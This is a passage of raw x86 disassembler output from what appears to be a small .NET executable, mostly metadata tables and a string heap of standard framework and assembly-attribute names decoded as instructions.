  4026ff:	pop    es
  402700:	data16 add BYTE PTR [esi],al
  402703:	add    dl,dl
  402705:	pop    es
  402706:	icebp  
  402707:	add    eax,DWORD PTR [esi]
  402709:	add    bh,ah
  40270b:	pop    es
  40270c:	data16 add BYTE PTR [esi],al
  40270f:	add    dl,dh
  402711:	pop    es
  402712:	data16 add BYTE PTR [esi],al
  402715:	add    BYTE PTR [ebx],cl
  402717:	or     dl,dl
  402719:	add    cl,BYTE PTR [esi]
  40271b:	add    BYTE PTR [esi],bh
  40271d:	or     BYTE PTR [esi],ah
  40271f:	or     BYTE PTR [esi],al
  402721:	add    BYTE PTR [ebp+0x8],dl
  402724:	icebp  
  402725:	add    eax,DWORD PTR [esi]
  402727:	add    BYTE PTR [edx+0x6006608],al
  40272d:	add    BYTE PTR [edi+0x6006608],al
  402733:	add    BYTE PTR [ebx+0xe01cb08],ch
  402739:	add    cl,ah
  40273b:	or     bl,cl
  40273d:	or     BYTE PTR [esi],cl
  40273f:	add    dl,bh
  402741:	or     bl,cl
  402743:	or     BYTE PTR [esi],al
  402745:	add    BYTE PTR [edi],bl
  402747:	or     DWORD PTR [edi],ecx
  402749:	or     DWORD PTR [eax],eax
  40274b:	add    BYTE PTR [eax],al
  40274d:	add    BYTE PTR [ecx],al
  40274f:	add    BYTE PTR [eax],al
  402751:	add    BYTE PTR [eax],al
  402753:	add    BYTE PTR [ecx],al
  402755:	add    BYTE PTR [ecx],al
  402757:	add    BYTE PTR [ecx+0x1b001001],al
  40275d:	add    BYTE PTR [ebx],ah
  40275f:	add    BYTE PTR ds:0x1000100,al
  402765:	add    BYTE PTR [eax],al
  402767:	add    BYTE PTR [eax],dl
  402769:	add    BYTE PTR [ebp+0x0],cl
  40276c:	and    eax,DWORD PTR [eax]
  40276e:	add    eax,0x3000100
  402773:	add    BYTE PTR [ebx],al
  402775:	add    DWORD PTR [eax],edx
  402777:	add    BYTE PTR [ebx+0x5000004],al
  40277d:	add    BYTE PTR [ebx],al
  40277f:	add    BYTE PTR [ecx],cl
  402781:	add    BYTE PTR [ebx],al
  402783:	add    DWORD PTR [eax],edx
  402785:	add    BYTE PTR [esi+0x5000004],dl
  40278b:	add    BYTE PTR [esi],al
  40278d:	add    BYTE PTR [ebx],cl
  40278f:	add    BYTE PTR [ecx],dl
  402791:	add    BYTE PTR [ebp+0x11001500],ch
  402797:	add    dl,bl
  402799:	add    BYTE PTR [ecx],bl
  40279b:	add    BYTE PTR [esi],al
  40279d:	add    ch,bh
  40279f:	add    al,0x18
  4027a1:	add    DWORD PTR [esi],eax
  4027a3:	add    BYTE PTR [edi],al
  4027a5:	add    eax,0x6011c
  4027aa:	push   0x6011f01
  4027af:	add    BYTE PTR [esi],bl
  4027b1:	add    eax,0x60127
  4027b6:	pop    ebp
  4027b7:	add    eax,0x21e4012b
  4027bc:	add    BYTE PTR [eax],al
  4027be:	add    BYTE PTR [eax],al
  4027c0:	xchg   esi,eax
  4027c1:	add    BYTE PTR [eax+eax*1+0xa],dh
  4027c5:	add    BYTE PTR [ecx],al
  4027c7:	add    BYTE PTR [eax+0x22],ah
  4027cd:	add    BYTE PTR [ecx+0x10007900],dl
  4027d3:	add    BYTE PTR [edx],al
  4027d5:	add    BYTE PTR [eax],cl
  4027d7:	and    eax,DWORD PTR [eax]
  4027d9:	add    BYTE PTR [eax],al
  4027db:	add    BYTE PTR [ebx+0x1d00ea18],al
  4027e1:	add    BYTE PTR [ebx],al
  4027e3:	add    BYTE PTR [eax],dl
  4027e5:	and    eax,DWORD PTR [eax]
  4027e7:	add    BYTE PTR [eax],al
  4027e9:	add    BYTE PTR [ebx+0x2100f008],dl
  4027ef:	add    BYTE PTR [ebx],al
  4027f1:	add    BYTE PTR [edi+0x23],cl
  4027f4:	add    BYTE PTR [eax],al
  4027f6:	add    BYTE PTR [eax],al
  4027f8:	xchg   ebx,eax
  4027f9:	or     BYTE PTR [ecx+eax*1],al
  4027fc:	add    BYTE PTR es:[ebx],al
  4027ff:	add    BYTE PTR [esi+0x23],dl
  402802:	add    BYTE PTR [eax],al
  402804:	add    BYTE PTR [eax],al
  402806:	xchg   ebx,eax
  402807:	or     BYTE PTR [eax],dl
  402809:	add    DWORD PTR [ebx],ebp
  40280b:	add    BYTE PTR [ebx],al
  40280d:	add    BYTE PTR [esi+0x23],bl
  402810:	add    BYTE PTR [eax],al
  402812:	add    BYTE PTR [eax],al
  402814:	xchg   ebx,eax
  402815:	or     BYTE PTR [ecx+eax*1],bl
  402818:	xor    DWORD PTR [eax],eax
  40281a:	add    al,0x0
  40281c:	je     0x402841
  40281e:	add    BYTE PTR [eax],al
  402820:	add    BYTE PTR [eax],al
  402822:	xchg   ebx,eax
  402823:	or     BYTE PTR [ecx],dh
  402825:	add    DWORD PTR [ecx],esi
  402827:	add    BYTE PTR [eax+eax*1],al
  40282a:	shl    BYTE PTR [eax],1
  40282c:	add    BYTE PTR [eax],al
  40282e:	add    BYTE PTR [eax],al
  402830:	xchg   BYTE PTR [eax],bl
  402832:	jmp    0x6000:0x4001d00
  402839:	and    DWORD PTR [eax],eax
  40283b:	add    BYTE PTR [eax],al
  40283d:	add    BYTE PTR [esi+0x23051300],al
  402843:	add    DWORD PTR [eax+eax*1],eax
  402846:	fsub   DWORD PTR [eax]
  402848:	add    BYTE PTR [eax],al
  40284a:	add    BYTE PTR [eax],al
  40284c:	xchg   BYTE PTR [eax],bl
  40284e:	jmp    0xe000:0x4001d00
  402855:	and    BYTE PTR [eax],al
  402857:	add    BYTE PTR [eax],al
  402859:	add    BYTE PTR [esi+0x2f057f00],al
  40285f:	add    DWORD PTR [eax+eax*1],eax
  402862:	add    BYTE PTR [eax],al
  402864:	add    DWORD PTR [eax],eax
  402866:	push   0x1000001
  40286b:	add    BYTE PTR [ebp+0x1],ch
  40286e:	add    BYTE PTR [eax],al
  402870:	add    DWORD PTR [eax],eax
  402872:	jl     0x402875
  402874:	add    BYTE PTR [eax],al
  402876:	add    DWORD PTR [eax],eax
  402878:	mov    al,BYTE PTR ds:0x20000
  40287e:	xchg   ecx,eax
  40287f:	add    eax,0xea0021
  402884:	inc    ebx
  402885:	add    BYTE PTR [ecx],ch
  402887:	add    dl,ch
  402889:	add    BYTE PTR [ebx+0x0],al
  40288c:	xor    DWORD PTR [eax],eax
  40288e:	jmp    0xea00:0x39004800
  402895:	add    BYTE PTR [eax+0x0],cl
  402898:	inc    ecx
  402899:	add    dl,ch
  40289b:	add    BYTE PTR [eax+0x0],cl
  40289e:	dec    ecx
  40289f:	add    dl,ch
  4028a1:	add    BYTE PTR [eax+0x0],cl
  4028a4:	push   ecx
  4028a5:	add    dl,ch
  4028a7:	add    BYTE PTR [eax+0x0],cl
  4028aa:	pop    ecx
  4028ab:	add    dl,ch
  4028ad:	add    BYTE PTR [eax+0x0],cl
  4028b0:	popa   
  4028b1:	add    dl,ch
  4028b3:	add    BYTE PTR [eax+0x0],cl
  4028b6:	imul   eax,DWORD PTR [eax],0x4300ea
  4028bc:	jno    0x4028be
  4028be:	jmp    0xea00:0x79004800
  4028c5:	add    BYTE PTR ds:0xea008100,bl
  4028cb:	add    BYTE PTR [eax+0x0],cl
  4028ce:	mov    DWORD PTR [eax],eax
  4028d0:	jmp    0xea00:0x91004800
  4028d7:	add    BYTE PTR [eax+0x0],cl
  4028da:	cdq    
  4028db:	add    dl,ch
  4028dd:	add    BYTE PTR [eax+0x0],cl
  4028e0:	mov    eax,ds:0x4800ea00
  4028e5:	add    BYTE PTR [ecx+0x4d00ea00],ch
  4028eb:	add    BYTE PTR [ecx+0x5300ea00],bh
  4028f1:	add    cl,cl
  4028f3:	add    dl,ch
  4028f5:	add    BYTE PTR [ecx+0x0],bl
  4028f8:	rol    DWORD PTR [eax],1
  4028fa:	jmp    0xea00:0x9010000
  402901:	add    BYTE PTR ds:0xea00f900,bl
  402907:	add    BYTE PTR [esi],dh
  402909:	add    ecx,esi
  40290b:	add    BYTE PTR [edx-0x16fec3fb],dh
  402911:	add    ch,cl
  402913:	add    eax,0xf90142
  402918:	fadd   DWORD PTR ds:0x1110048
  40291e:	in     eax,dx
  40291f:	add    eax,0xf10148
  402924:	repnz add eax,0x1110043
  40292a:	std    
  40292b:	add    eax,0x109014d
  402930:	jmp    0xb01:0x9013600
  402937:	push   es
  402938:	xor    DWORD PTR [eax],eax
  40293a:	sbb    DWORD PTR [ecx],eax
  40293c:	push   edx
  40293d:	add    eax,0x1210156
  402942:	cmp    eax,DWORD PTR [esi]
  402944:	pop    ecx
  402945:	add    ecx,ebp
  402947:	add    dl,ch
  402949:	add    BYTE PTR [edi+0x1],bl
  40294c:	sub    DWORD PTR [ecx],eax
  40294e:	jmp    0x6501:0x31016700
  402955:	push   es
  402956:	ins    DWORD PTR es:[edi],dx
  402957:	add    DWORD PTR [ecx],edi
  402959:	add    DWORD PTR [esi+eax*1+0xe90174],ecx
  402960:	lahf   
  402961:	push   es
  402962:	dec    ebp
  402963:	add    DWORD PTR [ecx+0x1],eax
  402966:	mov    bl,0x6
  402968:	jg     0x40296b
  40296a:	dec    ecx
  40296b:	add    ecx,edx
  40296d:	push   es
  40296e:	test   BYTE PTR [ecx],al
  402970:	push   ecx
  402971:	add    edx,ebp
  402973:	add    BYTE PTR [eax+0x0],cl
  402976:	pop    ecx
  402977:	add    edx,ebp
  402979:	add    BYTE PTR ds:0xea016100,bl
  40297f:	add    BYTE PTR [ecx-0x15fe86ff],cl
  402985:	add    BYTE PTR [edi+0x1],ah
  402988:	add    DWORD PTR [ecx],0x1940791
  40298e:	mov    DWORD PTR [ecx],eax
  402990:	lods   al,BYTE PTR ds:[esi]
  402991:	pop    es
  402992:	xor    DWORD PTR [eax],eax
  402994:	stc    
  402995:	add    dl,al
  402997:	pop    es
  402998:	dec    eax
  402999:	add    BYTE PTR [ecx+0x4800ea01],bl
  40299f:	add    BYTE PTR [ecx+0x1],cl
  4029a2:	in     al,dx
  4029a3:	pop    es
  4029a4:	mov    dh,0x1
  4029a6:	dec    ecx
  4029a7:	add    DWORD PTR [ebx],eax
  4029a9:	or     BYTE PTR [ebp-0x15fe4eff],bh
  4029af:	add    BYTE PTR ds:0xea01b900,bl
  4029b5:	add    dh,dl
  4029b7:	add    ecx,eax
  4029b9:	add    edx,ebp
  4029bb:	add    BYTE PTR ds:0x72000900,bl
  4029c1:	or     BYTE PTR ds:0x9901c902,bl
  4029c7:	or     BYTE PTR [ebx],ah
  4029c9:	add    cl,cl
  4029cb:	add    DWORD PTR [eax+ecx*1+0x11022c],esi
  4029d2:	jmp    0xc100:0x11023200
  4029d9:	or     BYTE PTR [edi],bh
  4029db:	add    ah,cl
  4029dd:	add    edx,ebp
  4029df:	add    BYTE PTR [esi+0x2],al
  4029e2:	icebp  
  4029e3:	add    edx,ebp
  4029e5:	add    BYTE PTR ds:0xab002000,bl
  4029eb:	add    BYTE PTR [esi],al
  4029ed:	add    DWORD PTR [edi],esp
  4029ef:	add    bl,ah
  4029f1:	add    ecx,edx
  4029f3:	add    DWORD PTR [ecx],ebp
  4029f5:	add    bl,bl
  4029f7:	add    DWORD PTR [ebp+0x2],ecx
  4029fa:	add    BYTE PTR cs:[ebx+0x2e123700],cl
  402a01:	add    BYTE PTR [ebx+0x2e151500],cl
  402a07:	add    BYTE PTR [ebx+0x2e167700],cl
  402a0d:	add    BYTE PTR [ebx+0x2e428700],ah
  402a13:	add    BYTE PTR [ebx+0x2e196300],cl
  402a19:	add    BYTE PTR [ebx+0x2e024d00],bl
  402a1f:	add    BYTE PTR [ebx],dl
  402a21:	add    BYTE PTR [esi+0x2],dl
  402a24:	add    BYTE PTR cs:[ebx],bl
  402a27:	add    BYTE PTR [edx+eax*1+0x2e],bl
  402a2b:	add    BYTE PTR [ebx],ah
  402a2d:	add    BYTE PTR [edx+eax*1+0x2e],bl
  402a31:	add    BYTE PTR [ebx],ch
  402a33:	add    BYTE PTR [edx+eax*1+0x2e],bl
  402a37:	add    BYTE PTR [ebx],dh
  402a39:	add    BYTE PTR [edx+0x2],dh
  402a3c:	add    BYTE PTR cs:[ebx],bh
  402a3f:	add    BYTE PTR [ebp+0x43002e02],cl
  402a45:	add    BYTE PTR [ebx+0x4b002e02],dh
  402a4b:	add    bh,ah
  402a4d:	add    ch,BYTE PTR [esi]
  402a4f:	add    BYTE PTR [ebx+0x0],dl
  402a52:	repnz add ch,BYTE PTR [esi]
  402a55:	add    BYTE PTR [ebx+0x0],bl
  402a58:	clc    
  402a59:	add    ch,BYTE PTR [esi]
  402a5b:	add    BYTE PTR [ebx+0x0],ah
  402a5e:	and    eax,DWORD PTR [ebx]
  402a60:	add    BYTE PTR cs:[ebx+0x0],dh
  402a64:	inc    edx
  402a65:	add    ebp,DWORD PTR [esi]
  402a67:	add    BYTE PTR [ebx+0x0],bh
  402a6a:	push   ebp
  402a6b:	add    ebp,DWORD PTR [esi]
  402a6d:	add    BYTE PTR [ebx+0x2e035500],al
  402a73:	add    BYTE PTR [ebx+0x2e036300],cl
  402a79:	add    BYTE PTR [ebx+0x2e04d400],cl
  402a7f:	add    BYTE PTR [ebx+0x2e064800],cl
  402a85:	add    BYTE PTR [ebx+0x2e07bf00],cl
  402a8b:	add    BYTE PTR [ebx+0x2e093900],cl
  402a91:	add    BYTE PTR [ebx+0x2e0ab900],cl
  402a97:	add    BYTE PTR [ebx+0x2e0c3200],cl
  402a9d:	add    BYTE PTR [ebx+0x2e0db100],cl
  402aa3:	add    BYTE PTR [ebx+0x2e0f3100],cl
  402aa9:	add    BYTE PTR [ebx+0x2e10b700],cl
  402aaf:	add    BYTE PTR [ebx+0x2e13b500],cl
  402ab5:	add    BYTE PTR [ebx+0x2e2bc800],cl
  402abb:	add    BYTE PTR [ebx+0x2e410500],cl
  402ac1:	add    BYTE PTR [ebx],cl
  402ac3:	add    BYTE PTR [esi+0x2],dl
  402ac6:	add    BYTE PTR cs:[ebx+0x2e1add00],cl
  402acd:	add    BYTE PTR [ebx+0x2e1c5c00],cl
  402ad3:	add    BYTE PTR [ebx+0x2e1dbc00],cl
  402ad9:	add    BYTE PTR [ebx+0x2e1f3600],cl
  402adf:	add    BYTE PTR [ebx+0x2e209c00],cl
  402ae5:	add    BYTE PTR [ebx+0x2e21f900],cl
  402aeb:	add    BYTE PTR [ebx+0x2e235600],cl
  402af1:	add    BYTE PTR [ebx+0x2e24d600],cl
  402af7:	add    BYTE PTR [ebx+0x2e264100],cl
  402afd:	add    BYTE PTR [ebx+0x2e279e00],cl
  402b03:	add    BYTE PTR [ebx+0x2e28fc00],cl
  402b09:	add    BYTE PTR [ebx+0x2e2a6100],cl
  402b0f:	add    BYTE PTR [ebx+0x2e17ea00],cl
  402b15:	add    BYTE PTR [ebx+0x2e2d2200],cl
  402b1b:	add    BYTE PTR [ebx+0x2e2e7b00],cl
  402b21:	add    BYTE PTR [ebx+0x2e300700],cl
  402b27:	add    BYTE PTR [ebx+0x2e316c00],cl
  402b2d:	add    BYTE PTR [ebx+0x2e32ef00],cl
  402b33:	add    BYTE PTR [ebx+0x2e346d00],cl
  402b39:	add    BYTE PTR [ebx+0x2e35c700],cl
  402b3f:	add    BYTE PTR [ebx+0x2e372600],cl
  402b45:	add    BYTE PTR [ebx+0x2e388500],cl
  402b4b:	add    BYTE PTR [ebx+0x2e39e100],cl
  402b51:	add    BYTE PTR [ebx+0x2e3b5e00],cl
  402b57:	add    BYTE PTR [ebx+0x2e3cc400],cl
  402b5d:	add    BYTE PTR [ebx+0x2e3e2800],cl
  402b63:	add    BYTE PTR [ebx+0x403f8400],cl
  402b69:	add    BYTE PTR [ebx+0x4901ab01],al
  402b6f:	add    bl,bl
  402b71:	add    DWORD PTR [ebp+0x2],ecx
  402b74:	arpl   WORD PTR [eax],ax
  402b76:	fwait
  402b77:	add    ecx,edx
  402b79:	add    DWORD PTR [ebx+0x0],esp
  402b7c:	stos   DWORD PTR es:[edi],eax
  402b7d:	add    ecx,edx
  402b7f:	add    DWORD PTR [ebx+0x0],esp
  402b82:	mov    ds:0x8301dc01,eax
  402b87:	add    BYTE PTR [ebx+0x801d101],bl
  402b8d:	add    BYTE PTR [esi],al
  402b8f:	add    BYTE PTR [eax+0x7a015142],dl
  402b95:	add    DWORD PTR [ecx+eax*1+0x23a01c6],ebx
  402b9c:	add    eax,DWORD PTR [eax]
  402b9e:	add    DWORD PTR [eax],eax
  402ba0:	add    BYTE PTR [eax],al
  402ba2:	popf   
  402ba3:	add    BYTE PTR ds:0x42000000,dh
  402ba9:	add    DWORD PTR [edx],edi
  402bab:	add    BYTE PTR [eax],al
  402bad:	add    BYTE PTR [edx+0x1],cl
  402bb0:	aas    
  402bb1:	add    BYTE PTR [eax],al
  402bb3:	add    BYTE PTR [ebx+0x1],bl
  402bb6:	aas    
  402bb7:	add    BYTE PTR [edx],al
  402bb9:	add    BYTE PTR [eax+eax*1],al
  402bbc:	add    eax,DWORD PTR [eax]
  402bbe:	add    DWORD PTR [eax],eax
  402bc0:	push   es
  402bc1:	add    BYTE PTR ds:0x5000200,al
  402bc7:	add    BYTE PTR ds:0x7000200,al
  402bcd:	add    BYTE PTR [edi],al
  402bcf:	add    BYTE PTR [edx],al
  402bd1:	add    BYTE PTR [eax],cl
  402bd3:	add    BYTE PTR [ecx],cl
  402bd5:	add    BYTE PTR [eax+eax*4],al
  402bd8:	add    BYTE PTR [eax],al
  402bda:	or     eax,DWORD PTR [eax]
  402bdc:	add    BYTE PTR [eax],al
  402bde:	add    BYTE PTR [eax],al
  402be0:	add    BYTE PTR [eax],al
  402be2:	add    DWORD PTR [eax],eax
  402be4:	add    BYTE PTR [eax],al
  402be6:	pop    esi
  402be7:	add    BYTE PTR [edi+0x4],al
  402bea:	add    BYTE PTR [eax],al
  402bec:	add    al,BYTE PTR [eax]
	...
  402bf6:	add    BYTE PTR [eax],al
  402bf8:	add    DWORD PTR [eax],eax
  402bfa:	pop    ebp
  402bfb:	add    BYTE PTR [eax],al
  402bfd:	add    BYTE PTR [eax],al
  402bff:	add    BYTE PTR [ebx],cl
	...
  402c09:	add    BYTE PTR [eax],al
  402c0b:	add    BYTE PTR [edi],cl
  402c0d:	add    DWORD PTR [ecx+0x4],ebp
  402c13:	add    BYTE PTR [edx],al
	...
  402c1d:	add    BYTE PTR [eax],al
  402c1f:	add    BYTE PTR [ecx],al
  402c21:	add    BYTE PTR [esi+0x0],ah
	...
  402c2c:	add    DWORD PTR [eax],eax
  402c2e:	add    BYTE PTR [eax],al
  402c30:	cmp    DWORD PTR [ecx],ecx
  402c32:	add    BYTE PTR [eax],al
  402c34:	add    al,0x0
  402c36:	add    al,BYTE PTR [eax]
  402c38:	add    eax,0x400
  402c3d:	add    BYTE PTR [eax],al
  402c3f:	add    BYTE PTR [eax],al
  402c41:	cmp    al,0x4d
  402c43:	outs   dx,DWORD PTR ds:[esi]
  402c44:	fs jne 0x402cb3
  402c47:	gs add BYTE PTR ds:[ecx+0x6e],cl
  402c4c:	je     0x402cb3
  402c4e:	ins    BYTE PTR es:[edi],dx
  402c4f:	ins    BYTE PTR es:[edi],dx
  402c50:	imul   edx,DWORD PTR [edx+esi*2+0x61],0x652e6563
  402c58:	js     0x402cbf
  402c5a:	add    BYTE PTR [eax+0x72],dl
  402c5d:	outs   dx,DWORD PTR ds:[esi]
  402c5e:	addr16 jb 0x402cc2
  402c61:	ins    DWORD PTR es:[edi],dx
  402c62:	add    BYTE PTR [ebp+0x69],cl
  402c65:	arpl   WORD PTR [edx+0x6f],si
  402c68:	jae    0x402cd9
  402c6a:	data16 je 0x402c9b
  402c6d:	push   esi
  402c6e:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  402c75:	jne    0x402cdb
  402c77:	imul   ebp,DWORD PTR [edi+0x2e],0x65746e49
  402c7e:	ins    BYTE PTR es:[edi],dx
  402c7f:	ins    BYTE PTR es:[edi],dx
  402c80:	imul   edx,DWORD PTR [edx+esi*2+0x61],0x542e6563
  402c88:	outs   dx,DWORD PTR ds:[esi]
  402c89:	outs   dx,DWORD PTR ds:[esi]
  402c8a:	ins    BYTE PTR es:[edi],dx
  402c8b:	jae    0x402c8d
  402c8d:	dec    esp
  402c8e:	outs   dx,DWORD PTR ds:[esi]
  402c8f:	addr16 addr16 gs jb 0x402ce6
  402c94:	gs jae 0x402d06
  402c97:	jne    0x402d0b
  402c99:	arpl   WORD PTR [ebp+0x73],sp
  402c9c:	add    BYTE PTR [ebp+0x73],ch
  402c9f:	arpl   WORD PTR [edi+0x72],bp
  402ca2:	ins    BYTE PTR es:[edi],dx
  402ca3:	imul   esp,DWORD PTR [edx+0x0],0x74737953
  402caa:	gs ins DWORD PTR es:[edi],dx
  402cac:	add    BYTE PTR [edi+0x62],cl
  402caf:	push   0x65
  402cb1:	arpl   WORD PTR [eax+eax*1+0x4d],si
  402cb5:	popa   
  402cb6:	imul   ebp,DWORD PTR [esi+0x0],0x6279614d
  402cbd:	gs inc ecx
  402cbf:	jae    0x402d34
  402cc1:	gs jb  0x402d38
  402cc4:	dec    edi
  402cc5:	outs   dx,BYTE PTR ds:[esi]
  402cc6:	push   ebx
  402cc7:	je     0x402d2a
  402cc9:	jb     0x402d3f
  402ccb:	add    BYTE PTR [ebx+0x79],dl
  402cce:	jae    0x402d44
  402cd0:	gs ins DWORD PTR es:[edi],dx
  402cd2:	cs push edx
  402cd4:	gs jae 0x402d46
  402cd7:	jne    0x402d4b
  402cd9:	arpl   WORD PTR [ebp+0x73],sp
  402cdc:	add    BYTE PTR [edx+0x65],dl
  402cdf:	jae    0x402d50
  402ce1:	jne    0x402d55
  402ce3:	arpl   WORD PTR [ebp+0x4d],sp
  402ce6:	popa   
  402ce7:	outs   dx,BYTE PTR ds:[esi]
  402ce8:	popa   
  402ce9:	addr16 gs jb 0x402ced
  402ced:	jb     0x402d54
  402cef:	jae    0x402d60
  402cf1:	jne    0x402d65
  402cf3:	arpl   WORD PTR [ebp+0x4d],sp
  402cf6:	popa   
  402cf7:	outs   dx,BYTE PTR ds:[esi]
  402cf8:	add    BYTE PTR [ebx+0x79],dl
  402cfb:	jae    0x402d71
  402cfd:	gs ins DWORD PTR es:[edi],dx
  402cff:	cs inc edi
  402d01:	ins    BYTE PTR es:[edi],dx
  402d02:	outs   dx,DWORD PTR ds:[esi]
  402d03:	bound  esp,QWORD PTR [ecx+0x6c]
  402d06:	imul   edi,DWORD PTR [edx+0x61],0x6e6f6974
  402d0d:	add    BYTE PTR [ebx+0x75],al
  402d10:	ins    BYTE PTR es:[edi],dx
  402d11:	je     0x402d88
  402d13:	jb     0x402d7a
  402d15:	dec    ecx
  402d16:	outs   dx,BYTE PTR ds:[esi]
  402d17:	outs   dx,WORD PTR ds:[esi]
  402d19:	add    BYTE PTR [edx+0x65],dh
  402d1c:	jae    0x402d8d
  402d1e:	jne    0x402d92
  402d20:	arpl   WORD PTR [ebp+0x43],sp
  402d23:	jne    0x402d91
  402d25:	je     0x402d9c
  402d27:	jb     0x402d8e
  402d29:	add    BYTE PTR [esi],ch
  402d2b:	arpl   WORD PTR [edi+ebp*2+0x72],si
  402d2f:	add    BYTE PTR [edi+0x65],ah
  402d32:	je     0x402d93
  402d34:	push   edx
  402d35:	gs jae 0x402da7
  402d38:	jne    0x402dac
  402d3a:	arpl   WORD PTR [ebp+0x4d],sp
  402d3d:	popa   
  402d3e:	outs   dx,BYTE PTR ds:[esi]
  402d3f:	popa   
  402d40:	addr16 gs jb 0x402d44
  402d44:	addr16 gs je 0x402da7
  402d48:	inc    ebx
  402d49:	jne    0x402db7
  402d4b:	je     0x402dc2
  402d4d:	jb     0x402db4
  402d4f:	add    BYTE PTR [ebx+0x65],dh
  402d52:	je     0x402db3
  402d54:	inc    ebx
  402d55:	jne    0x402dc3
  402d57:	je     0x402dce
  402d59:	jb     0x402dc0
  402d5b:	add    BYTE PTR [edi+0x65],ah
  402d5e:	je     0x402dbf
  402d60:	inc    ebx
  402d61:	je     0x402dd5
  402d63:	ins    BYTE PTR es:[edi],dx
  402d64:	inc    edx
  402d65:	jb     0x402dcc
  402d67:	popa   
  402d68:	imul   edx,DWORD PTR [eax+0x72],0x65
  402d6c:	jae    0x402de1
  402d6e:	gs add BYTE PTR fs:[edi+0x65],ah
  402d73:	je     0x402dd4
  402d75:	inc    ebx
  402d76:	je     0x402dea
  402d78:	ins    BYTE PTR es:[edi],dx
  402d79:	inc    ebx
  402d7a:	push   eax
  402d7b:	jb     0x402de2
  402d7d:	jae    0x402df2
  402d7f:	gs add BYTE PTR fs:[ebx+0x75],al
  402d84:	ins    BYTE PTR es:[edi],dx
  402d85:	je     0x402dfc
  402d87:	jb     0x402dee
  402d89:	add    BYTE PTR [ebx+0x74],al
  402d8c:	jb     0x402dfa
  402d8e:	inc    edx
  402d8f:	jb     0x402df6
  402d91:	popa   
  402d92:	imul   edx,DWORD PTR [eax+0x72],0x65
  402d96:	jae    0x402e0b
  402d98:	gs add BYTE PTR fs:[ebx+0x74],al
  402d9d:	jb     0x402e0b
  402d9f:	inc    ebx
  402da0:	push   eax
  402da1:	jb     0x402e08
  402da3:	jae    0x402e18
  402da5:	gs add BYTE PTR fs:[ecx+0x72],ah
  402daa:	addr16 jae 0x402dad
  402dad:	jb     0x402e14
  402daf:	ins    DWORD PTR es:[edi],dx
  402db0:	outs   dx,DWORD PTR ds:[esi]
  402db1:	je     0x402e18
  402db3:	dec    ecx
  402db4:	outs   dx,BYTE PTR ds:[esi]
  402db5:	jae    0x402e2b
  402db7:	popa   
  402db8:	outs   dx,BYTE PTR ds:[esi]
  402db9:	arpl   WORD PTR [ebp+0x0],sp
  402dbc:	jbe    0x402e1f
  402dbe:	ins    BYTE PTR es:[edi],dx
  402dbf:	jne    0x402e26
  402dc1:	add    BYTE PTR [ebx+0x79],dl
  402dc4:	jae    0x402e3a
  402dc6:	gs ins DWORD PTR es:[edi],dx
  402dc8:	cs push edx
  402dca:	jne    0x402e3a
  402dcc:	je     0x402e37
  402dce:	ins    DWORD PTR es:[edi],dx
  402dcf:	gs cs dec ecx
  402dd2:	outs   dx,BYTE PTR ds:[esi]
  402dd3:	je     0x402e3a
  402dd5:	jb     0x402e46
  402dd7:	jo     0x402e2c
  402dd9:	gs jb  0x402e52
  402ddc:	imul   esp,DWORD PTR [ebx+0x65],0x6f430073
  402de3:	ins    DWORD PTR es:[edi],dx
  402de4:	push   esi
  402de5:	imul   esi,DWORD PTR [ebx+0x69],0x41656c62
  402dec:	je     0x402e62
  402dee:	jb     0x402e59
  402df0:	bound  esi,QWORD PTR [ebp+0x74]
  402df3:	add    BYTE PTR gs:[ebx+0x4c],al
  402df7:	push   ebx
  402df8:	inc    ebx
  402df9:	outs   dx,DWORD PTR ds:[esi]
  402dfa:	ins    DWORD PTR es:[edi],dx
  402dfb:	jo     0x402e69
  402dfd:	imul   esp,DWORD PTR [ecx+0x6e],0x74744174
  402e04:	jb     0x402e6f
  402e06:	bound  esi,QWORD PTR [ebp+0x74]
  402e09:	add    BYTE PTR gs:[ebx+0x79],dl
  402e0d:	jae    0x402e83
  402e0f:	gs ins DWORD PTR es:[edi],dx
  402e11:	cs push edx
  402e13:	gs data16 ins BYTE PTR es:[edi],dx
  402e16:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  402e1b:	outs   dx,BYTE PTR ds:[esi]
  402e1c:	add    BYTE PTR [ecx+0x73],al
  402e1f:	jae    0x402e86
  402e21:	ins    DWORD PTR es:[edi],dx
  402e22:	bound  ebp,QWORD PTR [ecx+edi*2+0x54]
  402e26:	imul   esi,DWORD PTR [esp+ebp*2+0x65],0x72747441
  402e2e:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  402e35:	jae    0x402eaa
  402e37:	gs ins DWORD PTR es:[edi],dx
  402e39:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  402e3d:	gs jae 0x402ea3
  402e40:	jb     0x402eab
  402e42:	jo     0x402eb8
  402e44:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  402e4b:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  402e52:	jae    0x402ec7
  402e54:	gs ins DWORD PTR es:[edi],dx
  402e56:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  402e5a:	gs popaw 
  402e5d:	jne    0x402ecb
  402e5f:	je     0x402ea2
  402e61:	ins    BYTE PTR es:[edi],dx
  402e62:	imul   esp,DWORD PTR [ecx+0x73],0x72747441
  402e69:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  402e70:	jae    0x402ee5
  402e72:	gs ins DWORD PTR es:[edi],dx
  402e74:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  402e78:	outs   dx,DWORD PTR ds:[esi]
  402e79:	ins    DWORD PTR es:[edi],dx
  402e7a:	jo     0x402edd
  402e7c:	outs   dx,BYTE PTR ds:[esi]
  402e7d:	jns    0x402ec0
  402e7f:	je     0x402ef5
  402e81:	jb     0x402eec
  402e83:	bound  esi,QWORD PTR [ebp+0x74]
  402e86:	add    BYTE PTR gs:[ecx+0x73],al
  402e8a:	jae    0x402ef1
  402e8c:	ins    DWORD PTR es:[edi],dx
  402e8d:	bound  ebp,QWORD PTR [ecx+edi*2+0x50]
  402e91:	jb     0x402f02
  402e93:	fs jne 0x402ef9
  402e96:	je     0x402ed9
  402e98:	je     0x402f0e
  402e9a:	jb     0x402f05
  402e9c:	bound  esi,QWORD PTR [ebp+0x74]
  402e9f:	add    BYTE PTR gs:[ecx+0x73],al
  402ea3:	jae    0x402f0a
  402ea5:	ins    DWORD PTR es:[edi],dx
  402ea6:	bound  ebp,QWORD PTR [ecx+edi*2+0x43]
  402eaa:	outs   dx,DWORD PTR ds:[esi]
  402eab:	jo     0x402f26
  402ead:	jb     0x402f18
